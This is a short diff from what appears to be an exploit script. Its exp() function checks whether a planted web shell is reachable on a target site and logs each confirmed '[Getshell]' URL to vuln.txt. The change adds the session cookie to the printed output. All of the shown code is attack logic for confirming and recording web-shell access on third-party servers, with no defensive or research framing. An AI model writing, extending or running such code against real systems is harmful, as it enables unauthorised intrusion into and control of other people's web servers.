@@ -88,7 +88,7 @@ def exp(u):
                 shellPath = u + webPath
                 req3 = requests.get(shellPath, headers=header, verify=False, timeout=25)
                 if shellFlag in req3.text:
-                    printFlag = "[Getshell]：" + shellPath + "\n"
+                    printFlag = "[Getshell]：" + shellPath + "\t" + cookie + "\n"
                     wirte_targets(shellPath, "vuln.txt")
     except:
         pass
